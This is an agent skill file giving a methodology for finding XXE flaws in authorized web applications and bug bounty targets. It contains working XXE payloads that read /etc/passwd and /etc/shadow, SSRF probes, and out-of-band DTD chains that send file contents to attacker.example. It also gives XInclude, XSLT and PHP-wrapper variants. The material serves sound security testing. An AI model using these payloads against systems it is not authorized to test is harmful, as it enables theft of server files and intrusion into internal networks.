---
name: xxe-detect
description: Guide Claude to test authorized web applications and public bug bounty programs for XML External Entity (XXE), XML Injection, file disclosure, SSRF, blind/OOB XXE, XInclude, XSLT, and XML parser misconfiguration using only the referenced methodologies.
---


# Overview
 
XML External Entity (XXE) injection is a parser-level vulnerability that occurs when an application processes untrusted XML input containing references to external entities. If the XML parser is not properly configured (i.e., external entities and DOCTYPE are not disabled), an attacker can:
 
- **File disclosure**: Read sensitive server files (`/etc/passwd`, `/etc/shadow`, `c:/windows/win.ini`, source code, config credentials).
- **SSRF**: Reach internal metadata services, admin panels, and service ports inside the internal network.
- **Denial of Service**: Exploit entity expansion (billion laughs) or fetch slow external resources.
- **Code Execution**: On certain stacks (XSLT with `expect://`, PHP with the `expect://` module enabled).
Per OWASP WSTG (WSTG-INPV-07), the test objectives are to identify XML injection points and assess the types of exploits that can be attained and their severities. Every XML input must be treated as untrusted until the parser is proven hardened.

### Prerequisites & Tools

- **Burp MCP**: Used to analyze Request/Response packets, raw HTTP headers from browsing history, or intercept data.

- **Burp Collaborator**: Used to detect out-of-band interactions that confirm file access, SSRF, or code execution.

# Mindset

Treat every XML consumer as untrusted until parser hardening is proven.

Do not assume that XML only appears in obvious `.xml` endpoints. XML parsing often exists behind upload, import, transform, preview, convert, report, SAML, SOAP, SVG, Office document, and background job flows.

Think in parser capabilities, not just payloads. The key questions are:

- Can the parser accept XML metacharacters?
- Can the parser accept `DOCTYPE`?
- Can the parser resolve internal entities?
- Can the parser resolve external entities?
- Can the parser load external DTDs?
- Can the parser use parameter entities?
- Can the parser access the filesystem?
- Can the parser access the network?
- Can it process XInclude?
- Can it process XSLT `document()`?
- Does behavior differ between direct requests, file uploads, SOAP/SAML flows, and asynchronous processors?

Prefer minimal, controlled probes. Avoid destructive payloads such as Billion Laughs on production systems unless the testing scope explicitly permits Denial of Service validation.

- **Treat every XML consumer as a suspect**: Not just traditional REST endpoints — SOAP, SAML ACS endpoints, file uploads (SVG, DOCX/XLSX/PPTX, ODT), PDF generators, report pipelines, and config importers are all potential attack surfaces.
- **In-band vs. Out-of-band**: Output is not always directly visible. Always set up an OAST channel (Burp Collaborator, interactsh) from the start to detect blind XXE.
- **Parser options vary per code path**: The same application may use different parser configurations across a REST endpoint and a background job. Test every path separately.
- **Escalate from capability probe to impact**: Start with a small probe confirming the parser resolves entities before sending payloads targeting specific files.
- **Avoid noise**: Do not use billion-laughs payloads unless the scope explicitly allows DoS testing. Keep payloads minimal.
- **False positive awareness**: DOCTYPE accepted but entity not resolved, or a sandbox returning entity strings literally without performing any I/O — these are not real XXE.

---

# Approach

Start by inventorying XML consumers.

Look for:

- Request bodies with `Content-Type: application/xml`, `text/xml`, SOAP XML, SAML XML, XML-RPC, RSS, Atom, WebDAV, or custom XML payloads.
- Parameters or paths named `xml`, `upload`, `import`, `transform`, `xslt`, `xsl`, `xinclude`, `svg`, `soap`, `saml`, `report`, `convert`, or `preview`.
- File uploads that accept SVG, MathML, DOCX, XLSX, PPTX, ODT, ODS, ODG, ODP, XML-based archives, config imports, plist files, or report templates.
- Server-side renderers and converters such as SVG-to-PNG/PDF, document previewers, report generators, XSLT processors, and XML-to-HTML flows.
- Background jobs, CLI processors, third-party SDKs, and asynchronous pipelines that may parse XML after the initial request.

Then establish the parser behavior in stages.

1. Test XML metacharacters.

Use single quote, double quote, `<`, `>`, comment delimiters, ampersand, and CDATA delimiters to see whether user input is embedded into XML and whether parser errors appear.

Relevant probes:

```text
'
"
<
>
<!--
-->
&
]]>
<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
```

2. Test internal entity expansion.

Use a harmless internal entity first. If the parser expands `&example;`, entity processing is active.

```xml
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY example "Doe">]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

Expected signal: the application output, transformed document, or downstream result contains `Doe`.

3. Test external entity behavior.

Use controlled file paths and controlled network callbacks. Do not jump straight to sensitive targets without proving parser behavior.

Classic local file probe:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ELEMENT data (#ANY)>
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

Windows local file probe:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini">
]>
<foo>&xxe;</foo>
```

SSRF probe:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt">
]>
<foo>&xxe;</foo>
```

4. If direct response does not show output, use error-based and OOB channels.

Blind XXE may require parameter entities, external DTDs, DNS/HTTP callbacks, or error messages that include interpolated entity data.

Remote DTD trigger:

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY % ext SYSTEM "http://attacker.example/ext.dtd">
  %ext;
]>
<message></message>
```

Example remote DTD pattern:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

OOB parameter entity pattern:

```xml
<!DOCTYPE x [
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
```

`evil.dtd`:

```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/%f;'>">
%e;
%exfil;
```

5. Test XInclude when `DOCTYPE` cannot be modified.

XInclude may still be processed even when external entity resolution is blocked.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

6. Test XSLT document loading where XML transformation is present.

XSLT processors can load external resources through `document()`.

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Focus this test on transform endpoints, reporting engines, XSLT/Jasper/FOP-like flows, and `xml-stylesheet` processing.

7. Test special contexts.

SOAP:

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <d>&xxe;</d>
  </soap:Body>
</soap:Envelope>
```

SVG and renderers:

- Inline SVG and server-side SVG-to-image/PDF renderers process XML.
- Test entities and XInclude inside SVG when the target accepts SVG upload or rendering.

Office documents:

- DOCX, XLSX, and PPTX are ZIP containers with XML files.
- Insert XXE payloads into XML parts such as `document.xml`, relationship files, or drawing XML, then repackage and upload.

SAML:

- SAML assertions are XML-signed, but upstream XML parsers before signature verification may still process entities or XInclude.
- Use minimal probes against ACS endpoints.

8. Review source code and parser configuration when available.

Look for XML APIs and libraries that may be vulnerable if not configured safely.

Java keywords and APIs:

```text
javax.xml.parsers.DocumentBuilder
javax.xml.parsers.DocumentBuildFactory
org.xml.sax.EntityResolver
org.dom4j.*
javax.xml.parsers.SAXParser
javax.xml.parsers.SAXParserFactory
TransformerFactory
SAXReader
DocumentHelper
SAXBuilder
SAXParserFactory
XMLReaderFactory
XMLInputFactory
SchemaFactory
DocumentBuilderFactoryImpl
SAXTransformerFactory
XMLReader
Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser
```

C keywords and APIs:

```text
libxml2: xmlCtxtReadMemory, xmlCtxtUseOptions, xmlParseInNodeContext, xmlReadDoc, xmlReadFd, xmlReadFile, xmlReadIO, xmlReadMemory, xmlCtxtReadDoc, xmlCtxtReadFd, xmlCtxtReadFile, xmlCtxtReadIO
libxerces-c: XercesDOMParser, SAXParser, SAX2XMLReader
```

Check whether `DOCTYPE`, external DTDs, and external parameter entities are explicitly forbidden.

# Methodology

Use this workflow when Claude is asked to test or reason about XXE.

## 1. Scope and entry point mapping

Identify every input path that may reach an XML parser:

- API request body.
- SOAP body.
- SAML ACS endpoint.
- XML-RPC endpoint.
- RSS/Atom import.
- WebDAV endpoint.
- File upload.
- SVG preview or conversion.
- Office document preview or conversion.
- Report template upload.
- Config import.
- XSL/XSLT transform endpoint.
- XML-to-HTML output generation.
- Background job or asynchronous processor.

For each entry point, capture:

- Endpoint URL or feature name.
- HTTP method.
- Content type.
- Required authentication state.
- Whether XML is sent directly or embedded inside a file.
- Whether output is direct, asynchronous, transformed, or error-only.
- Whether callbacks can be observed through DNS/HTTP.

## 2. Discovery through XML metacharacters

Inject metacharacters into each controllable value and observe whether XML parsing errors occur.

Payload set:

```text
'
"
<
>
<!--
-->
&
]]>
```

Interpretation:

- Parser error after quote injection may indicate the input is placed inside an XML attribute.
- Parser error after `<` or `>` may indicate the input is placed inside XML element content.
- Error after `&` may indicate entity parsing behavior.
- CDATA delimiter behavior may indicate XML-to-HTML processing or unsafe CDATA handling.
- Comment delimiters may allow tag commenting and XML structure manipulation.

## 3. Internal entity probe

Send a minimal `DOCTYPE` with an internal entity.

```xml
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY example "Doe">]>
<root>&example;</root>
```

Classify the result:

- `Doe` appears: internal entity expansion works.
- `&example;` appears literally: entity expansion likely disabled or output is not parsed server-side.
- Parser rejects `DOCTYPE`: parser may be hardened or a filter blocks it.
- Error changes but no expansion: continue with error-based tests.

## 4. External entity probe

Use a controlled local file or controlled URL.

Local file:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test SYSTEM "file:///etc/passwd">
]>
<root>&test;</root>
```

Remote URL:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test SYSTEM "http://attacker.example/probe">
]>
<root>&test;</root>
```

Classify the result:

- File content in response: direct file disclosure.
- HTTP/DNS callback observed: blind or OOB XXE.
- Error includes path or content fragments: error-based XXE.
- Timeout/latency shift: possible external fetch behavior.
- No output and no callback: external entity may be blocked, or parser path not reached.

## 5. Blind and OOB XXE

When direct disclosure fails, use external DTD and parameter entities.

Use OAST/DNS/HTTP callbacks to correlate:

- Unique callback domain per request.
- Unique path per endpoint.
- Unique token per payload.
- Timestamp correlation with the triggering request.

Payload trigger:

```xml
<!DOCTYPE x [
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
```

DTD:

```xml
<!ENTITY % f SYSTEM "file:///etc/hostname">
<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/%f;'>">
%e;
%exfil;
```

Evidence required:

- Callback log.
- Trigger request.
- Exact payload.
- Correlation token.
- Affected endpoint or upload path.

## 6. Error-based XXE

Use parser error behavior to leak path fragments or content.

Local DTD approach:

```xml
<!DOCTYPE root [
  <!ENTITY % local_dtd SYSTEM "file:///abcxyz/">
  %local_dtd;
]>
<root></root>
```

If the application error shows file path information, test local DTD concatenation techniques.

Common Linux local DTD locations to check with local DTD techniques:

```text
/usr/share/xml/fontconfig/fonts.dtd
/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
/usr/share/xml/svg/svg10.dtd
/usr/share/xml/svg/svg11.dtd
/usr/share/yelp/dtd/docbookx.dtd
```

Use tools such as `dtd-finder` when local DTD payload generation is needed.

## 7. File disclosure impact validation

Use non-destructive, scoped file targets first.

Examples from the references:

```text
/etc/passwd
/etc/shadow
/etc/hostname
c:/boot.ini
c:/windows/win.ini
```

For PHP stacks, test PHP wrapper behavior where appropriate:

```xml
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

Do not overclaim impact. State exactly which file path was readable and what proof was observed.

## 8. SSRF impact validation

Use controlled URLs first, then internal targets only when permitted.

Test whether the XML parser can reach:

- Attacker-controlled HTTP/DNS listener.
- Internal service hostname.
- Loopback service.
- Cloud/container metadata endpoint where in-scope.

SSRF payload pattern:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt">
]>
<foo>&xxe;</foo>
```

Evidence:

- HTTP/DNS callback.
- Response body disclosure.
- Status or error difference.
- Timing difference.
- Internal service banner or version response.

## 9. XInclude and transclusion

If entities fail, test XInclude.

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

Classify separately from classic XXE. It is still XML parser/transclusion risk but may require different remediation.

## 10. XSLT document loading

Where XSLT is accepted or XML is transformed, test `document()`.

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

Targets:

- Transform endpoints.
- Reporting engines.
- XML-to-HTML conversion.
- `xml-stylesheet` processing.

## 11. XML tag injection

If input is embedded into XML, test whether tags can be injected to alter document structure.

Example concept:

```xml
</mail><userid>0</userid><mail>
```

If duplicate tags are rejected by DTD/schema validation, test comment-based structure manipulation:

```xml
</password><!--
--><userid>0</userid><mail>
```

Impact may include privilege escalation or application logic manipulation if later XML processing trusts the injected element.

## 12. Bypass testing

Use only after establishing a parser or filter behavior.

Encoding variants:

- UTF-16 XML declaration.
- UTF-7 XML declaration.
- Mixed newlines.
- CDATA sections.
- XML comments.

DOCTYPE variants:

- `SYSTEM`.
- `PUBLIC`.
- Mixed-case `<!DoCtYpE>`.
- Internal subset.
- External subset.
- Parameter entities.

Context pivots:

- If network access is blocked but filesystem reads work, focus on file disclosure.
- If filesystem reads are blocked but network access works, focus on SSRF/OOB.
- If direct XML is blocked, test SVG, SOAP, SAML, Office, and background processors.

## 13. Validation Before Reporting
 
1. Provide a minimal payload proving parser capability (DOCTYPE / XInclude / XSLT).
2. Demonstrate controlled access (file path or internal URL) with reproducible evidence.
3. Confirm blind channels with OAST and correlate to the triggering request.
4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths).
5. Bound impact clearly: exact files/data reached or internal targets proven.

# Tips & Tricks

- Set `Content-Type: application/xml` or `text/xml` when sending XML payloads if the endpoint behavior depends on content type.
- Start with internal entity expansion before external file or network access.
- Use OAST/DNS/HTTP callbacks early when the response does not directly reflect parser output. If not can ask user to set up an OAST channel before testing.
- Keep payloads small and deterministic.
- Avoid Billion Laughs and other DoS payloads on production unless explicitly authorized.
- Test upload processors separately from direct API endpoints.
- Test asynchronous/background processing separately; parser settings often differ.
- Try XInclude when `DOCTYPE` is blocked.
- Try XSLT `document()` only where XML transformation is actually present.
- In file uploads, repackage OOXML/SVG instead of relying only on standalone XML.
- Check both direct response and secondary outputs such as generated PDFs, preview images, reports, emails, logs, and error pages.
- Use response size, ETag, timing, and error shape as side channels when content is not directly shown.
- If the app reflects `&xxe;` literally, do not mark it as XXE.
- If XML is processed only in the browser, do not report server-side XXE.
- When source code is available, verify actual parser APIs and flags instead of assuming WAF behavior is sufficient.
- For PHP parsers, `php://filter/convert.base64-encode/resource=...` may be useful where PHP stream wrappers are available.
- For Java/XML stacks, review parser factories, SAX/DOM APIs, `XMLInputFactory`, `TransformerFactory`, `SchemaFactory`, and Xerces usage.
- For C/XML stacks, review libxml2 and libxerces-c parsing calls and parser options.
- Document exact parser behavior per endpoint; remediation must apply consistently across REST, SOAP, SAML, file upload, transform, and background paths.

# References

- PayloadsAllTheThings - XXE Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
- OWASP Web Security Testing Guide - Testing for XML Injection: https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection
- Strix - XXE Skill: https://github.com/usestrix/strix/blob/main/strix/skills/vulnerabilities/xxe.md